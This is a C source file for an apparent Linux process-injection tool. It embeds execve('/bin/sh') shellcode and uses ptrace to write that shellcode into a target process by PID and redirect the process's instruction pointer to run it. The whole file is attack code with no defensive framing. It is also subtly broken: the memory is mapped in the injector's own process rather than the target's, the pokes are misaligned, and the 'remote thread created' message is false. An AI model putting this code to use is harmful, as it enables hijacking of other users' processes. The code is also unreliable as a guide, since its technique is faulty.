#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

// Simple shellcode for /bin/sh
unsigned char shellcode[] = 
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void create_remote_thread(pid_t pid, unsigned char *shellcode, size_t shellcode_size) {
    // Attach to the target process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("ptrace(ATTACH)");
        exit(1);
    }
    wait(NULL); // Wait for the process to stop

    // Allocate memory in the target process for the shellcode
    void *remote_mem = mmap(NULL, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (remote_mem == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    // Write shellcode to the target process
    for (size_t i = 0; i < shellcode_size; i++) {
        if (ptrace(PTRACE_POKETEXT, pid, remote_mem + i, shellcode[i]) < 0) {
            perror("ptrace(POKETEXT)");
            exit(1);
        }
    }

    // Create a new thread in the target process to execute the shellcode
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(GETREGS)");
        exit(1);
    }

    // Save the original instruction pointer
    long original_eip = regs.eip;

    // Set the instruction pointer to the shellcode
    regs.eip = (long)remote_mem;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(SETREGS)");
        exit(1);
    }

    // Continue the process to execute the shellcode
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        perror("ptrace(CONT)");
        exit(1);
    }

    // Wait for the shellcode to execute
    sleep(1);

    // Restore the original instruction pointer
    regs.eip = original_eip;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(SETREGS)");
        exit(1);
    }

    // Detach from the target process
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
        perror("ptrace(DETACH)");
        exit(1);
    }

    printf("Remote thread created and executed in process %d\n", pid);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]); // Target process ID
    create_remote_thread(pid, shellcode, sizeof(shellcode));

    return 0;
}
